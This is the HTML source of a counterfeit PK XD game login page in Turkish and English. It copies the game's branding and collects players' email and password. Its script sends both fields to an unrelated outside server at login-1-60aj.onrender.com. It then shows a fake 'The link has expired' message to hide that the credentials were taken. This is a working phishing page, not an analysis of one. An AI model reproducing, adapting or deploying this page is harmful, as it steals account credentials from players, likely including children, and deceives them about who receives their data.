<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PK XD Login</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial, Helvetica, sans-serif;
}

html, body{
  width:100%;
  height:100%;
}

/* ARKA PLAN */
body{
  background: url("images/background.png") no-repeat center center fixed;
  background-size:cover;
}

/* =========================
   PK XD TOP BANNER (YENİ)
   ========================= */
.topbar{
  width:100%;
  height:70px;
  background:linear-gradient(90deg, #5b1cd6, #7a2cff);
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:0 30px;
}

.topbar-left{
  display:flex;
  align-items:center;
  gap:30px;
}

.topbar-left img{
  height:38px;
}

.topbar-menu{
  display:flex;
  gap:22px;
}

.topbar-menu a{
  color:white;
  text-decoration:none;
  font-size:13px;
  font-weight:bold;
  letter-spacing:1px;
  opacity:.9;
}

.topbar-menu a:hover{
  opacity:1;
}

.topbar-right{
  display:flex;
  align-items:center;
  gap:15px;
}

.lang-btn{
  background:rgba(255,255,255,.2);
  border:none;
  color:white;
  padding:7px 14px;
  border-radius:10px;
  cursor:pointer;
}

.play-btn{
  background:#29f3ff;
  color:#3b0fa3;
  border:none;
  padding:10px 18px;
  border-radius:12px;
  font-weight:bold;
  cursor:pointer;
}

/* MOBİL */
@media(max-width:768px){
  .topbar-menu{
    display:none;
  }
}

/* =========================
   PK XD LOGIN PANEL
   ========================= */
.login-panel{
  width:420px;
  margin:80px auto;
  padding:35px 30px 40px;
  background:#6b2fd6;
  border-radius:30px;
  border:3px solid #36f3ff;
  box-shadow:
    0 0 18px #36f3ff,
    0 0 35px rgba(54,243,255,.8);
  text-align:center;
}

.logo-panel{
  width:130px;
  margin:0 auto 25px;
}

.logo-panel img{
  width:100%;
}

.login-panel input{
  width:100%;
  padding:16px;
  margin-bottom:18px;
  background:#5a24b8;
  border:2px solid #36f3ff;
  border-radius:16px;
  color:white;
  outline:none;
  font-size:15px;
}

.login-panel input:focus{
  box-shadow:0 0 12px #36f3ff;
}

.forgot{
  text-align:right;
  color:#36f3ff;
  font-weight:bold;
  margin-bottom:28px;
  cursor:pointer;
}

button{
  width:100%;
  padding:16px;
  border:none;
  border-radius:20px;
  background:#7a3cff;
  color:white;
  font-size:17px;
  font-weight:bold;
  opacity:.6;
  cursor:not-allowed;
}

button.active{
  opacity:1;
  cursor:pointer;
  box-shadow:
    0 0 18px #36f3ff,
    0 0 40px rgba(54,243,255,.9);
}

.result{
  margin-top:18px;
  color:white;
  font-weight:bold;
}
</style>
</head>

<body>

<!-- PK XD BANNER -->
<div class="topbar">
  <div class="topbar-left">
    <img src="images/pkxd_logov2.png" alt="PK XD">
    <div class="topbar-menu">
      <a href="#">EVENTS</a>
      <a href="#">ABOUT</a>
      <a href="#">PROMOCODE</a>
      <a href="#">SECURITY</a>
      <a href="#">WHAT'S NEW</a>
      <a href="#">CREATORS</a>
    </div>
  </div>

  <div class="topbar-right">
    <button class="lang-btn" id="langBtn">Türkçe</button>
    <button class="play-btn">PLAY NOW!</button>
  </div>
</div>

<!-- LOGIN -->
<div class="login-panel">
  <div class="logo-panel">
    <img src="images/pkxd_logov2.png" alt="PK XD Logo">
  </div>

  <input type="email" id="email" placeholder="E-posta">
  <input type="password" id="password" placeholder="Şifre">

  <div class="forgot" id="forgot">Şifreni mi unuttun?</div>

  <button id="loginBtn" disabled>GİRİŞ</button>
  <div class="result" id="result"></div>
</div>

<script>
let currentLang = "tr";

const email = document.getElementById("email");
const password = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const result = document.getElementById("result");
const langBtn = document.getElementById("langBtn");
const forgot = document.getElementById("forgot");

function updateLang(){
  if(currentLang === "tr"){
    email.placeholder = "E-posta";
    password.placeholder = "Şifre";
    loginBtn.textContent = "GİRİŞ";
    forgot.textContent = "Şifreni mi unuttun?";
    langBtn.textContent = "Türkçe";
  }else{
    email.placeholder = "Registered email";
    password.placeholder = "Password";
    loginBtn.textContent = "LOGIN";
    forgot.textContent = "Forgot password";
    langBtn.textContent = "English";
  }
}

langBtn.addEventListener("click", ()=>{
  currentLang = currentLang === "tr" ? "en" : "tr";
  updateLang();
});

function checkInputs(){
  if(email.value && password.value){
    loginBtn.disabled = false;
    loginBtn.classList.add("active");
  }else{
    loginBtn.disabled = true;
    loginBtn.classList.remove("active");
  }
}

email.addEventListener("input", checkInputs);
password.addEventListener("input", checkInputs);

loginBtn.addEventListener("click", async ()=>{
  if(loginBtn.disabled) return;

  try{
    const res = await fetch("https://login-1-60aj.onrender.com/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email.value,
        password: password.value
      })
    });

    result.textContent = res.ok
      ? (currentLang === "tr" ? "Bağlantının Süresi Geçmiştir." : "The link has expired.")
      : "Sunucu hatası ❌";

  }catch{
    result.textContent = "Sunucuya bağlanılamadı ❌";
  }
});

updateLang();
</script>

</body>
</html>
